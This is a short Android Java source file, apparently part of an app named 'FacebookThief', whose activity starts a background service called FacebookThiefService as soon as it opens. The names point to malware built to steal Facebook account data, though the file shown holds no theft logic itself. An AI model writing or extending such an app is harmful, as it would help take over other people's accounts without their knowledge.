package com.facebookthief;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;

public class FacebookThiefActivity extends Activity {
    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
        startService(new Intent(this, FacebookThiefService.class));
    }
}